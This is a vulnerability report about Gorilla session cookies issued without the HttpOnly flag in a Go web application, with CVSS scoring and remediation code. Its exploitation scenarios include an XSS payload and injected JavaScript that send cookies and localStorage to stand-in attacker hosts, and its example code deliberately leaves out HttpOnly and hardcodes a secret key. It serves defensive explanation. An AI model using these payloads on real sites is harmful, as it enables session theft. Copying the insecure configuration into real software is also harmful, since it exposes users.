# Missing HttpOnly Flag in Session Cookies

# Vulnerability Case
During our security assessment of Acme Corp's Golang web application utilizing the Gorilla sessions library, we discovered that session cookies are issued without the `HttpOnly` flag. The absence of this attribute permits client-side scripts to access the cookie, which could be exploited via Cross-Site Scripting (XSS) to steal session identifiers. This misconfiguration was identified by analyzing HTTP response headers during dynamic testing, highlighting a gap in session security. The vulnerability poses significant risks including session hijacking and unauthorized access to sensitive user data, potentially leading to fraudulent activities and disruption of business operations.

```go
package main

import (
	"net/http"
	"github.com/gorilla/sessions"
)

var store = sessions.NewCookieStore([]byte("super-secret-key"))

func sessionHandler(w http.ResponseWriter, r *http.Request) {
	// Retrieve the session; note the missing HttpOnly flag.
	session, _ := store.Get(r, "session-cookie")
	session.Options = &sessions.Options{
		Path:   "/",
		MaxAge: 3600,
		// Vulnerable configuration: HttpOnly flag omitted
	}
	session.Values["user"] = "john.doe"
	session.Save(r, w)
}

func main() {
	http.HandleFunc("/login", sessionHandler)
	http.ListenAndServe(":8080", nil)
}
```

This vulnerability is present in a Golang application using the standard `net/http` package in combination with the Gorilla sessions library. An attacker could craft an XSS payload that reads the session cookie directly from the client-side, bypassing browser restrictions typically enforced by the `HttpOnly` flag. Successful exploitation can lead to session hijacking, unauthorized data access, and insertion of malicious actions under the guise of an authenticated user, thus causing substantial financial and reputational damage to Acme Corp.


context: go.gorilla.security.audit.session-cookie-missing-httponly.session-cookie-missing-httponly A session cookie was detected without setting the 'HttpOnly' flag. The 'HttpOnly' flag for cookies instructs the browser to forbid client-side scripts from reading the cookie which mitigates XSS attacks. Set the 'HttpOnly' flag by setting 'HttpOnly' to 'true' in the Options struct.

# Vulnerability Breakdown
This vulnerability involves the absence of the HttpOnly flag in session cookies issued by a Golang web application using the Gorilla sessions library. This security misconfiguration creates a significant risk vector in the application's session management system.

1. **Key vulnerability elements**:
   - Session cookies configured without the HttpOnly flag in a Golang web application
   - Usage of Gorilla sessions library with incomplete security configuration
   - Explicit omission of the HttpOnly flag in the session.Options structure
   - Exposure of session identifiers to potential client-side script access

2. **Potential attack vectors**:
   - Cross-Site Scripting (XSS) attacks that can access and exfiltrate session cookies
   - Session hijacking leading to unauthorized authentication
   - Man-in-the-Browser attacks that can steal session data
   - Malicious browser extensions or client-side JavaScript that can access cookies

3. **Severity assessment**:
   - The vulnerability requires an additional XSS vulnerability to exploit (higher complexity)
   - No special privileges required to launch the attack
   - User interaction is required (victim must trigger the XSS vulnerability)
   - High confidentiality impact as session data can be fully compromised
   - Limited integrity impact focused on session manipulation
   - No direct availability impact

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

# Description
A security vulnerability was discovered in Acme Corp's Golang web application that uses the Gorilla sessions library for session management. The application is configured to issue session cookies without the `HttpOnly` flag, which is a critical security attribute that prevents client-side scripts from accessing cookie data.

In the vulnerable code, the session configuration explicitly sets various cookie options but omits the `HttpOnly` flag:

```go
session.Options = &sessions.Options{
	Path:   "/",
	MaxAge: 3600,
	// Vulnerable configuration: HttpOnly flag omitted
}

```

Without the `HttpOnly` flag, cookies containing session identifiers are accessible to JavaScript running in the browser. If an attacker can execute malicious JavaScript in the victim's browser (through Cross-Site Scripting or other client-side attacks), they can steal the session cookie and use it to impersonate the victim, potentially gaining unauthorized access to sensitive information and functionality within the application.

# CVSS
**Score**: 5.9 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N \
**Severity**: Medium

The Medium severity rating (CVSS score 5.9) is based on the following assessment:

- **Network Attack Vector (AV:N)**: The vulnerability is remotely exploitable over the internet, as it affects web session cookies.

- **High Attack Complexity (AC:H)**: Exploitation requires an additional vulnerability (such as XSS) to access the cookies, increasing complexity. The attacker needs to find an injection point and craft a payload specifically to steal cookies.

- **No Privileges Required (PR:N)**: No authentication is needed to exploit this vulnerability. An unauthenticated attacker can execute the attack if they can find an XSS vulnerability.

- **User Interaction Required (UI:R)**: Successful exploitation typically requires the victim to visit a malicious page or click on a specially crafted link that executes the XSS payload.

- **Unchanged Scope (S:U)**: The vulnerability impacts only the vulnerable component (the web application) without crossing privilege boundaries.

- **High Confidentiality Impact (C:H)**: Successful exploitation can lead to complete disclosure of session data, potentially allowing full account takeover and access to all user data.

- **Low Integrity Impact (I:L)**: While the attacker cannot directly modify data, they can perform actions as the victim, resulting in a limited integrity impact.

- **No Availability Impact (A:N)**: The vulnerability does not directly affect system availability.

While the confidentiality impact is high, the overall score is moderated by the need for an additional vulnerability (XSS) and user interaction, resulting in a Medium severity classification.

# Exploitation Scenarios
**Scenario 1: Blog Comment XSS Attack**
An attacker discovers that Acme Corp's blog allows HTML in comments and doesn't properly sanitize user input. The attacker posts a comment containing a malicious script:

```html
Great article! <script>var img = new Image(); img.src = "https://attacker.com/steal?cookie=" + document.cookie;</script>

```

When legitimate users view the comment, the script executes in their browsers and sends their session cookies to the attacker's server. Because the session cookies lack the HttpOnly flag, the JavaScript can access them. The attacker then uses these stolen session identifiers to impersonate the victims, accessing their accounts without authorization.

**Scenario 2: Third-Party JavaScript Compromise**
Acme Corp's application uses several third-party JavaScript libraries for analytics and UI components. An attacker compromises one of these third-party services (or its CDN). The compromised script is then served to all users of Acme Corp's application, containing code that harvests session cookies and transmits them to the attacker's server:

```javascript
// Malicious code injected into legitimate third-party script
(function() {
  var stolenData = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage)
  };
  fetch('https://analytics-collector.evil.com/data', {
    method: 'POST',
    body: JSON.stringify(stolenData)
  });
})();

```

The attacker collects thousands of valid session identifiers and conducts a large-scale account takeover campaign.

**Scenario 3: Targeted Spear-phishing Attack**
An attacker targets a specific high-value employee (such as an administrator) at Acme Corp. After researching the target on social media, the attacker sends a personalized email containing a link to what appears to be a relevant industry article.

The link actually points to a malicious page containing an exploit for a zero-day browser vulnerability that executes JavaScript without user permission. This script extracts the session cookie from Acme Corp's domain and transmits it to the attacker.

The attacker then uses the administrator's session to access sensitive company data, modify system configurations, or create backdoor accounts for persistent access.

# Impact Analysis
**Business Impact:**
- Unauthorized access to user accounts leading to privacy violations and data breaches
- Potential exposure of sensitive customer information stored in user sessions
- Financial losses from fraudulent transactions performed through hijacked sessions
- Compliance violations with regulations like GDPR, CCPA, or PCI DSS that require proper protection of user data
- Reputational damage and loss of customer trust if a breach occurs and becomes public
- Potential legal liability from affected users whose accounts were compromised
- Business disruption if critical administrative accounts are compromised

**Technical Impact:**
- Complete bypass of authentication mechanisms via session hijacking
- Access to sensitive functions and data through valid session identifiers
- Potential privilege escalation if administrator sessions are compromised
- Ability to perform any action the victim user is authorized to perform
- Difficulty in detecting the compromise as actions appear to come from legitimate users
- Potential for data exfiltration from the application without triggering security alerts
- Creation of persistent threats through establishment of backdoor accounts
- Chaining with other vulnerabilities to increase impact (e.g., using stolen admin session to introduce more vulnerabilities)

# Technical Details
The vulnerability is found in a Golang web application utilizing the Gorilla sessions library for session management. The issue stems from incomplete session cookie configuration where the HttpOnly flag is omitted.

**Vulnerable Code Analysis:**

```go
package main

import (
	"net/http"
	"github.com/gorilla/sessions"
)

var store = sessions.NewCookieStore([]byte("super-secret-key"))

func sessionHandler(w http.ResponseWriter, r *http.Request) {
	// Retrieve the session; note the missing HttpOnly flag.
	session, _ := store.Get(r, "session-cookie")
	session.Options = &sessions.Options{
		Path:   "/",
		MaxAge: 3600,
		// Vulnerable configuration: HttpOnly flag omitted
	}
	session.Values["user"] = "john.doe"
	session.Save(r, w)
}

func main() {
	http.HandleFunc("/login", sessionHandler)
	http.ListenAndServe(":8080", nil)
}

```

**Technical Vulnerability Details:**

1. **HttpOnly Flag Purpose**: The HttpOnly flag, when set on cookies, instructs browsers to prevent JavaScript from accessing the cookie via the `document.cookie` API. This is a critical defense against session hijacking via XSS attacks.

2. **Default Configuration**: In the Gorilla sessions library, if no options are explicitly set, the default includes `HttpOnly: true`. However, in this code, the developer has explicitly configured options without including this crucial flag, thus overriding the secure default.

3. **HTTP Response Headers**: When this code executes, the response headers would include:
   ```
   Set-Cookie: session-cookie=encoded-session-data; Path=/; Max-Age=3600
   
```
   Notably missing is the `HttpOnly` attribute that would appear as:
   ```
   Set-Cookie: session-cookie=encoded-session-data; Path=/; Max-Age=3600; HttpOnly
   
```

4. **Client-side Vulnerability**: With this configuration, any JavaScript running in the context of the application's domain can access the session cookie:
   ```javascript
   // This will retrieve the session cookie
   var sessionCookie = document.cookie;
   console.log(sessionCookie);
   
```

5. **Attack Prerequisites**: This vulnerability requires an XSS vulnerability or another way to execute JavaScript in the victim's browser. While this adds a layer of complexity, XSS vulnerabilities are common enough to make this a significant risk.

6. **Secure Key Storage Issue**: As a secondary concern, the code also hardcodes the secret key (`"super-secret-key"`) used for cookie encryption, which is another security issue that could make cookie forgery possible if the source code is exposed.

# Remediation Steps
## Enable HttpOnly Flag on Session Cookies

**Priority**: P0

Modify the session configuration to include the HttpOnly flag:

```go
session.Options = &sessions.Options{
	Path:     "/",
	MaxAge:   3600,
	HttpOnly: true, // Add HttpOnly flag to prevent JavaScript access
}

```

This simple change will instruct browsers to prevent client-side scripts from accessing the cookie content, significantly reducing the risk of session hijacking through XSS attacks. The fix is minimal and should not impact any legitimate functionality of the application, as there should be no need for JavaScript to access session cookies directly.
## Implement Additional Cookie Security Attributes

**Priority**: P1

Enhance cookie security by implementing additional attributes for comprehensive protection:

```go
session.Options = &sessions.Options{
	Path:     "/",
	MaxAge:   3600,
	HttpOnly: true,
	Secure:   true,           // Ensure cookies are only sent over HTTPS
	SameSite: http.SameSiteLaxMode, // Protect against CSRF attacks
	Domain:   "acme-corp.com", // Restrict to specific domain
}

```

Adding these attributes provides multiple layers of protection:

1. `Secure: true` ensures cookies are only transmitted over encrypted HTTPS connections, preventing exposure during transit.

2. `SameSite: http.SameSiteLaxMode` restricts cookie transmission to same-site requests or specific cross-site navigation scenarios, mitigating CSRF and certain XSS attacks.

3. `Domain` explicitly sets the domain scope for the cookie, preventing unintended sharing across subdomains unless specifically configured.

These additional security measures work together with the HttpOnly flag to create a comprehensive defense against various session-related attacks.


# References
* CWE-1004 | [Sensitive Cookie Without 'HttpOnly' Flag](https://cwe.mitre.org/data/definitions/1004.html)
* A05:2021 | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* A07:2021 | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
